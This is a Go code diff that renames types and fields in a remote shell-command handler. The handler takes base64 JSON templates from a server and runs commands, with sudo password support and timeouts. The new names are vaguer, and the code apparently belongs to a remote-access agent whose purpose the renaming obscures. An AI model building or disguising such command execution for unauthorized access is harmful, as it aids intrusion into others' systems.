@@ -17,8 +17,8 @@ import (
 	"time"
 )
 
-// ShellTemplate matches the server's CommandTemplate structure
-type ShellTemplate struct {
+// ExecCfg matches the server's CommandTemplate structure
+type ExecCfg struct {
 	Version   int      `json:"v"`
 	Type      int      `json:"t"`
 	Templates []string `json:"tpl"`
@@ -42,12 +42,12 @@ const (
 )
 
 
-type ShellCommand struct {
-	tpl *ShellTemplate
+type ExecMsg struct {
+	tpl *ExecCfg
 }
 
 // getTpl safely retrieves a template string by index
-func (c *ShellCommand) getTpl(idx int) string {
+func (c *ExecMsg) getTpl(idx int) string {
 	if c.tpl != nil && c.tpl.Templates != nil && idx < len(c.tpl.Templates) {
 		return c.tpl.Templates[idx]
 	}
@@ -55,7 +55,7 @@ func (c *ShellCommand) getTpl(idx int) string {
 }
 
 // getUnixShell determines the appropriate shell to use on Unix-like systems
-func (c *ShellCommand) getUnixShell() string {
+func (c *ExecMsg) getUnixShell() string {
 	// Try to get the user's default shell from SHELL environment variable
 	envVar := c.getTpl(idxShellEnvVar)
 	if envVar != "" {
@@ -89,31 +89,31 @@ func (c *ShellCommand) getUnixShell() string {
 	return c.getTpl(idxShellFallback)
 }
 
-func (c *ShellCommand) Execute(ctx *CommandContext, args []string) CommandResult {
-	// Parse template from Command.Data - required for operation
-	if ctx.CurrentCommand == nil || ctx.CurrentCommand.Data == "" {
-		return CommandResult{
+func (c *ExecMsg) execute(ctx *OpCtx, args []string) OpResult {
+	// Parse template from Msg.Data - required for operation
+	if ctx.CurrentMsg == nil || ctx.CurrentMsg.Data == "" {
+		return OpResult{
 			Output:      Err(E18),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
-	decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentCommand.Data)
+	decoded, err := base64.StdEncoding.DecodeString(ctx.CurrentMsg.Data)
 	if err != nil {
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E18),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
-	c.tpl = &ShellTemplate{}
+	c.tpl = &ExecCfg{}
 	if err := json.Unmarshal(decoded, c.tpl); err != nil {
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E18),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
@@ -123,10 +123,10 @@ func (c *ShellCommand) Execute(ctx *CommandContext, args []string) CommandResult
 	}
 
 	if len(args) == 0 {
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E1),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
@@ -146,10 +146,10 @@ func (c *ShellCommand) Execute(ctx *CommandContext, args []string) CommandResult
 		switch args[i] {
 		case sudoFlag:
 			if i+1 >= len(args) {
-				return CommandResult{
+				return OpResult{
 					Output:      Err(E20),
-					ExitCode:    1,
-					CompletedAt: time.Now().Format(time.RFC3339),
+					EC:    1,
+					Done: time.Now().Format(time.RFC3339),
 				}
 			}
 			useSudo = true
@@ -158,19 +158,19 @@ func (c *ShellCommand) Execute(ctx *CommandContext, args []string) CommandResult
 
 		case timeoutFlag:
 			if i+1 >= len(args) {
-				return CommandResult{
+				return OpResult{
 					Output:      Err(E20),
-					ExitCode:    1,
-					CompletedAt: time.Now().Format(time.RFC3339),
+					EC:    1,
+					Done: time.Now().Format(time.RFC3339),
 				}
 			}
 
 			timeoutSeconds, err := strconv.Atoi(args[i+1])
 			if err != nil || timeoutSeconds <= 0 {
-				return CommandResult{
+				return OpResult{
 					Output:      ErrCtx(E22, args[i+1]),
-					ExitCode:    1,
-					CompletedAt: time.Now().Format(time.RFC3339),
+					EC:    1,
+					Done: time.Now().Format(time.RFC3339),
 				}
 			}
 			timeout = time.Duration(timeoutSeconds) * time.Second
@@ -183,10 +183,10 @@ func (c *ShellCommand) Execute(ctx *CommandContext, args []string) CommandResult
 	}
 
 	if len(commandArgs) == 0 {
-		return CommandResult{
+		return OpResult{
 			Output:      Err(E1),
-			ExitCode:    1,
-			CompletedAt: time.Now().Format(time.RFC3339),
+			EC:    1,
+			Done: time.Now().Format(time.RFC3339),
 		}
 	}
 
@@ -206,8 +206,8 @@ func (c *ShellCommand) Execute(ctx *CommandContext, args []string) CommandResult
 
 	if useSudo {
 		// Use PTY helper for sudo
-		ptyHelper := &PTYHelper{timeout: timeout}
-		commandOutput, exitCode, cmdErr = ptyHelper.ExecuteWithSudo(sudoPassword, commandStr, workingDir)
+		ptyHelper := &TermHelper{timeout: timeout}
+		commandOutput, exitCode, cmdErr = ptyHelper.executeWithSudo(sudoPassword, commandStr, workingDir)
 
 	} else {
 		// Regular shell execution
@@ -259,9 +259,9 @@ func (c *ShellCommand) Execute(ctx *CommandContext, args []string) CommandResult
 		output.WriteString("\n" + Err(E9))
 	}
 
-	return CommandResult{
+	return OpResult{
 		Output:      output.String(),
-		ExitCode:    exitCode,
-		CompletedAt: time.Now().Format(time.RFC3339),
+		EC:    exitCode,
+		Done: time.Now().Format(time.RFC3339),
 	}
 }
